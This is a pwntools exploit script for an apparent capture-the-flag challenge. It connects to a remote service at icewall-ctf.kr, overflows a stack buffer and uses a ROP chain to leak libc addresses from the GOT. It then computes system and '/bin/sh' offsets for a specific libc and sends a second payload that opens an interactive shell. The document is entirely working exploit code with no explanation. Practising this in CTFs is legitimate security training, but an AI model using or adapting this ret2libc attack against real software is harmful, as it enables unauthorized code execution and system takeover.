from pwn import *
import sys

if len(sys.argv) == 1 :
	p = process('./vuln')
else :
	p = connect('icewall-ctf.kr', 10205)

# Gadget
pop_rdi_ret = 0x4007C3
ret = 0x400549

# Addr
puts_got = 0x601018
puts_plt = 0x400560
gets_got = 0x601030

payload = 'A'*(0x20+8)
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi_ret)
payload += p64(gets_got)
payload += p64(puts_plt)
payload += p64(0x4006B6)   # func: vuln

p.sendlineafter('?', payload)
p.recvuntil('!')

puts_addr_s = p.recvline()[:-1]
gets_addr_s = p.recvline()[:-1]

print '[NOTICE] Libc version : libc6_2.23-0ubuntu10_amd64'
print 'puts address : '+''.join('%02X ' % ord(b) for b in puts_addr_s)
print 'gets address : '+''.join('%02X ' % ord(b) for b in gets_addr_s)

puts_addr = u64(puts_addr_s+'\x00\x00')
system_addr = puts_addr + (0x45390-0x6F690)
str_bin_sh_addr = puts_addr + (0x18CD57-0x6F690)

payload = 'A'*(0x20+8)
payload += p64(pop_rdi_ret)
payload += p64(str_bin_sh_addr)
payload += p64(system_addr)

p.sendline(payload)

p.interactive()
